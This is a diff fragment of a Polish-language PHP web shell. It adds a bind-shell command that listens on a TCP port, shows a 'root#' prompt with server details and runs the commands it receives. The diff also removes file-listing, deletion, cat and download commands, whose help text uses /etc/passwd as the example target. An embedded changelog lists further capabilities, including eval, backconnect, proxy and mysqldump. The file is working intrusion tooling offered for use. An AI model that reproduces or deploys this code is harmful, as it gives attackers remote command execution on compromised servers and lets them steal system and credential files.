+		 * Sprawdzanie poprawnosci portu
 		 */
-		$sDir = ( ! empty( $this -> sArgv ) ? $this -> sArgv : dirname( __FILE__ ) );
+		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
+		{
+			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
+		}
 
-		$bList      = in_array( 'l', $this -> aOptv );
-		$bRecursive = in_array( 'R', $this -> aOptv );
+		/**
+		 * Tworzenie socketa
+		 */
+		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) )
+		{
+			return 'Nie można utworzyć połączenia';
+		}
 
-		try
+		/**
+		 * Bindowanie
+		 */
+		if( ! ( socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) ) )
+		{
+			return sprintf( 'Nie można zbindować "0.0.0.0:%d"', $this -> aArgv[0] );
+		}
+
+		if( ! ( socket_listen( $rSock ) ) )
+		{
+			return sprintf( 'Nie można nasłuchiwać "0.0.0.0:%d"', $this -> aArgv[0] );
+		}
+
+		$bConnected = FALSE;
+
+		/**
+		 * bind
+		 */
+		for(;;)
 		{
 			/**
-			 * Jezeli chcemy wyswietlic pliki i katalogi rekurencyjnie to uzywamy
-			 * obiektu RecursiveDirectoryIterator
+			 * Klient
 			 */
-			if( $bRecursive )
+			if( ! ( $rClient = socket_accept( $rSock ) ) )
 			{
-				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $sDir ), RecursiveIteratorIterator::SELF_FIRST );
+				usleep( 10000 );
 			}
 			else
 			{
-				$oDirectory = new DirectoryIterator( $sDir );
-			}
-
-			/**
-			 * Informacja o komendzie jaka wykonalismy
-			 */
-			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArgv );
-
-			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );
-
-			foreach( $oDirectory as $oFile )
-			{
-				if( $bList )
+				/**
+				 * Naglowek
+				 */
+				if( ! $bConnected )
 				{
-					/**
-					 * Windows ?
-					 */
-					if( $this -> bWindows )
-					{
-						$sOutput .= sprintf( "%s %11d %s %s\n",
-							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
-							$oFile -> getSize(), date( 'Y-m-d h:i',
-								$oFile -> getCTime() ),
-							$oFile -> {$sFileName}()
-						);
-					}
-					else
-					{
-						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\n",
-							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
-							substr( sprintf( '%o', $oFile -> getPerms() ), -4 ),
-							$this -> getOwnerById( $oFile -> getOwner() ),
-							$this -> getGroupById( $oFile -> getGroup() ),
-							$oFile -> getSize(), date( 'Y-m-d h:i',
-							$oFile -> getCTime() ), $oFile -> {$sFileName}()
-						);
-					}
-				}
-				else
-				{
-					$sOutput .= sprintf( "%s %s\n", ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' ), $oFile -> {$sFileName}() );
-				}
-			}
-
-			return htmlspecialchars( $sOutput );
-		}
-		catch( Exception $oException )
-		{
-			return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
-		}
-	}
-
-	/**
-	 * Komenda - remove
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandRemove()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-remove, rm, delete, del - Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie
-
-	Użycie:
-		remove ścieżka_do_katalogu_lub_pliku
-HELP;
-		}
-
-		$sOutput = NULL;
-
-		/**
-		 * Jezeli podana sciezka to plik
-		 */
-		if( is_file( $this -> sArgv ) )
-		{
-			if( ! unlink( $this -> sArgv ) )
-			{
-				return sprintf( 'Plik "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
-			}
-
-			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> sArgv );
-		}
-		/**
-		 * Jezeli podana sciezka to katalog
-		 */
-		if( is_dir( $this -> sArgv ) )
-		{
-			try
-			{
-				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> sArgv, RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );
-
-				foreach( $oDirectory as $oFile )
-				{
-					if( $oFile -> isDir() )
-					{
-						/**
-						 * Usuwanie katalogu
-						 */
-						if( ! rmdir( $oFile -> getPathname() ) )
-						{
-							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
-						}
-					}
-					else
-					{
-						/**
-						 * Usuwanie pliku
-						 */
-						if( ! unlink( $oFile -> getPathname() ) )
-						{
-							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
-						}
-					}
+					socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
+					$bConnected = TRUE;
 				}
 
 				/**
-				 * Usuwanie ostatniego katalogu
+				 * Komenda
 				 */
-				if( ! rmdir( $this -> sArgv ) )
+				for(;;)
 				{
-					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
+					if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
+					{
+						if( $sCmd === ':exit' )
+						{
+							socket_write( $rClient, "\r\nDobranoc ;)" );
+							socket_close( $rSock );
+							socket_close( $rClient );
+
+							echo 'Zakończono bindowanie';
+							exit ;
+						}
+
+						socket_write( $rClient, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
+						socket_write( $rClient, "\r\nroot#" );
+					}
 				}
 			}
-			catch( Exception $oException )
-			{
-				return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
-			}
-
-			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> sArgv );
 		}
-
-		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> sArgv );
-	}
-
-	/**
-	 * Komenda - bcat
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandBCat()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64
-
-	Użycie:
-		bcat ścieżka_do_pliku
-
-	Przykład:
-		bcat /etc/passwd
-HELP;
-		}
-
-		/**
-		 * Plik zrodlowy musi istniec
-		 */
-		if( ! is_file( $this -> sArgv ) )
-		{
-			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
-		}
-
-		/**
-		 * Naglowek Mime i zrodlo pliku w base64
-		 */
-		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
-			basename( $this -> sArgv ), basename( $this -> sArgv )
-		);
-
-		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> sArgv ) ), 130 ) );
-	}
-
-	/**
-	 * Komenda - cat
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandCat()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-cat - Wyświetlanie zawartości pliku
-
-	Użycie:
-		cat ścieżka_do_pliku
-
-	Przykład:
-		cat /etc/passwd
-HELP;
-		}
-
-		/**
-		 * Plik zrodlowy musi istniec
-		 */
-		if( ! is_file( $this -> sArgv ) )
-		{
-			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
-		}
-
-		return htmlspecialchars( file_get_contents( $this -> sArgv ) );
-	}
-
-	/**
-	 * Komenda - download
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandDownload()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-download, down, get - Pobieranie pliku
-
-	Użycie:
-		download ścieżka_do_pliku
-
-	Opcje:
-		-g pobieranie przy użyciu kompresji GZIP
-
-	Przykład:
-		download /etc/passwd
-		download -g /etc/passwd
-HELP;
-		}
-
-		$bGzip = in_array( 'g', in_array( 'R', $this -> aOptv ) );
-
-		/**
-		 * Plik zrodlowy musi istniec
-		 */
-		if( ! is_file( $this -> sArgv ) )
-		{
-			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
-		}
-
-		/**
-		 * Kompresja zawartosci strony
-		 */
-		if( $bGzip )
-		{
-			ini_set( 'zlib.output_compression', 9 );
-		}
-
-		ob_start();
-
-		/**
-		 * Naglowki
-		 */
-		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
-		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> sArgv ) ), TRUE );
-		header( 'Content-Type: application/octet-stream', TRUE );
-
-		if( ( $rFile = fopen( $this -> sArgv, 'r' ) ) !== FALSE )
-		{
-			if( ! $bGzip )
-			{
-				header( sprintf( 'Content-Length: %s', filesize( $this -> sArgv ) ), TRUE );
-			}
-
-			while( ! feof( $rFile ) )
-			{
-				echo fread( $rFile, 131072 );
-				ob_flush();
-				flush();
-			}
-		}
-
-		ob_end_flush();
-		exit ;
-	}
-
-	/**
-	 * Komenda - phpinfo
-	 *
-	 * @uses   Html
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandPhpInfo()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-phpinfo - Informacje o PHP
-
-	Użycie:
-		{$this -> sPhpInfo}
-HELP;
-		}
-
-		ob_start();
-		phpinfo();
-		$sData = ob_get_contents();
-		ob_clean();
-		ob_end_flush();
-
-		/**
-		 * Wywalanie zbednych tresci, klasy itp
-		 * Licencje kazdy zna
-		 */
-		$sData = str_replace( array
-			(
-				' class="e"',
-				' class="v"'
-			),
-			'',
-			substr( $sData,
-				strpos( $sData, '<div class="center">' ) + 20,
-				-( strlen( $sData ) - strrpos( $sData, '<h2>PHP License</h2>' ) )
-			)
-		);
-
-		/**
-		 * logo kazdy widzial, creditsy tez
-		 */
-		$sData = preg_replace( '~<a href="http://www.php.net/"><img border="0" src="[^"]+" alt="PHP Logo" /></a><h1 class="p">(.+?)</h1>~', '<h1>$1</h1>', $sData );
-		$sData = preg_replace( '~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData );
-		$sData = preg_replace( '~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData );
-
-		return Html::shrink( $sData );
 	}
 
 	/**
@@ -1737,96 +1692,6 @@ HELP;
 	}
 
 	/**
-	 * Komenda - chmod
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandChmod()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc === 2 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-chmod - Zmiana uprawnień dla pliku
-
-	Użycie:
-		chmod uprawnienie plik_lub_katalog
-
-	Przykład:
-		chmod 777 /tmp/plik
-HELP;
-		}
-
-		/**
-		 * Chmod jest wymagany
-		 */
-		if( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 3 )
-		{
-			return sprintf( 'Błędny chmod "%d"', $this -> aArgv[0] );
-		}
-
-		/**
-		 * Plik musi istniec
-		 */
-		if( ! is_file( $this -> aArgv[1] ) )
-		{
-			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
-		}
-
-		if( chmod( $this -> aArgv[1], $this -> aArgv[0] ) )
-		{
-			return 'Uprawnienia <span class="green">zostały zmienione</span>';
-		}
-
-		return 'Uprawnienia <span class="red">nie zostały zmienione</span>';
-	}
-
-	/**
-	 * Komenda - chmod
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandCr3d1ts()
-	{
-		return <<<HELP
-Jak to się mówi: <strong>&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;</strong>
-
-Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
-
-Jakies sugestie, pytania ? Piszcie śmiało: <strong>Krzychu</strong> - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
-
-ps, sprawdziłeś komendę <strong>:g4m3</strong> ?
-
-Changelog:
-2011-05-21
-----------
-* dodano polecenie: <strong>mysqldump</strong>
-
-2011-05-20
-----------
-* dodano komendy: <strong>proxy</strong>, <strong>ping</strong>, <strong>mysql</strong>
-* <strong>php</strong> jest aliasem dla <strong>eval</strong>
-* wsparcie dla CLI
-
-2011-05-16
-----------
-* Shella rozszerzono o następujące komendy: <strong>cp</strong>, <strong>mv</strong>, <strong>mkdir</strong>, <strong>bind</strong>, <strong>backconnect</strong>,
-  <strong>chmod</strong>, <strong>cr3d1ts</strong>
-* komendy <strong>g4m3</strong> i <strong>cr3d1ts</strong> nie wyświetlają się w helpie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
-
-2011-05-15 v0.1
----------------
-* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak: <strong>echo</strong>, <strong>eval</strong>,
-  <strong>etcpasswd</strong>, <strong>socketdownload</strong>, <strong>socketupload</strong>, <strong>ftpdownload</strong>, <strong>ftpupload</strong>, <strong>ls</strong>, <strong>cat</strong>,
-  <strong>bcat</strong>, <strong>download</strong>, <strong>help</strong>, <strong>remove</strong>, game</strong>
-HELP;
-	}
-
-	/**
 	 * Komenda - proxy
 	 *
 	 * @access private
@@ -1854,7 +1719,6 @@ proxy - Proxy HTTP
 	Proxy te nie sluży do przeglądania youtuba, a wyłacznie do pobieranie małych plików tekstowych
 
 	Aby zatrzymać serwer nalezy wyslac do niego polecenie ":exit"
-
 
 	Użycie:
 		proxy [opcja] port
@@ -1970,8 +1834,6 @@ HELP;
 						exit ;
 					case 'ping':
 						echo "Command -> ping\n";
-
-
 						socket_close( $rClient );
 						break ;
 				}
@@ -2136,6 +1998,123 @@ HELP;
 		socket_close( $rSock );
 		ob_end_flush();
 		exit ;
+	}
+
+	/**
+	 * Komenda - chmod
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandCr3d1ts()
+	{
+		return <<<HELP
+Jak to się mówi: <strong>&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;</strong>
+
+Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
+
+Jakies sugestie, pytania ? Piszcie śmiało: <strong>Krzychu</strong> - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
+
+ps, sprawdziłeś komendę <strong>:g4m3</strong> ?
+
+Changelog:
+2011-05-21
+----------
+* dodano polecenie: <strong>mysqldump</strong>
+
+2011-05-20
+----------
+* dodano komendy: <strong>proxy</strong>, <strong>ping</strong>, <strong>mysql</strong>
+* <strong>php</strong> jest aliasem dla <strong>eval</strong>
+* wsparcie dla CLI
+
+2011-05-16
+----------
+* Shella rozszerzono o następujące komendy: <strong>cp</strong>, <strong>mv</strong>, <strong>mkdir</strong>, <strong>bind</strong>, <strong>backconnect</strong>,
+  <strong>chmod</strong>, <strong>cr3d1ts</strong>
+* komendy <strong>g4m3</strong> i <strong>cr3d1ts</strong> nie wyświetlają się w helpie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
+
+2011-05-15 v0.1
+---------------
+* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak: <strong>echo</strong>, <strong>eval</strong>,
+  <strong>etcpasswd</strong>, <strong>socketdownload</strong>, <strong>socketupload</strong>, <strong>ftpdownload</strong>, <strong>ftpupload</strong>, <strong>ls</strong>, <strong>cat</strong>,
+  <strong>bcat</strong>, <strong>download</strong>, <strong>help</strong>, <strong>remove</strong>, game</strong>
+HELP;
+	}
+
+	/**
+	 * Komenda - game
+	 *
+	 * @ignore
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandG4m3()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+g4m3 - Gra z komputerem, wspaniała na samotne wieczory ;)
+
+	Sprawdziłeś już komende <strong>:cr3d1ts</strong> ?
+
+	Użycie:
+		g4m3 cyfra_z_przedziału_0-9
+
+		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
+HELP;
+		}
+
+		/**
+		 * Jesli 'liczba' jest rowna 'x' to komputer sam losuje liczby
+		 */
+		if( ( $this -> aArgv[0] !== 'x' ) && ( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 1 ) )
+		{
+			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
+		}
+
+		/**
+		 * Maksymalnie 1000 losowan
+		 */
+		if( isset( $this -> aArgv[1] ) && ( ! ctype_digit( $this -> aArgv[1] ) || ( $this -> aArgv[1] > 1000 ) ) )
+		{
+			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
+		}
+
+		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 10 );
+
+		$sOutput = NULL;
+
+		$iWins  = 0;
+		$iLoses = 0;
+
+		$iDigit = (int) $this -> aArgv[0];
+
+		$i = 0;
+		do
+		{
+			if( $this -> aArgv[0] === 'x' )
+			{
+				$iDigit = mt_rand( 0, 9 );
+			}
+
+			if( ( $iNum = mt_rand( 0, 9 ) ) === $iDigit )
+			{
+				$sOutput .= sprintf( "<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
+				++$iWins;
+			}
+			else
+			{
+				$sOutput .= sprintf( "<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
+				++$iLoses;
+			}
+		}
+		while( ++$i < $iLoop );
+
+		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\n\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
 	}
 
 	/**
@@ -2520,6 +2499,31 @@ CONTENT;
 		return $sData;
 
 	}
+
+	/**
+	 * Oczyszczanie argumentow ze zbednych znakow
+	 *
+	 * @access private
+	 * @param  string & $sVar Argument
+	 * @return void
+	 */
+	private function parseArgv( & $sVar )
+	{
+		$sVar = strtr( $sVar, array
+			(
+				'\\\'' => '\'',
+				'\\"'  => '"'
+			)
+		);
+
+		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
+		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
+		)
+		{
+			$sVar = substr( $sVar, 1, -1 );
+		}
+	}
+
 }
 
 /**
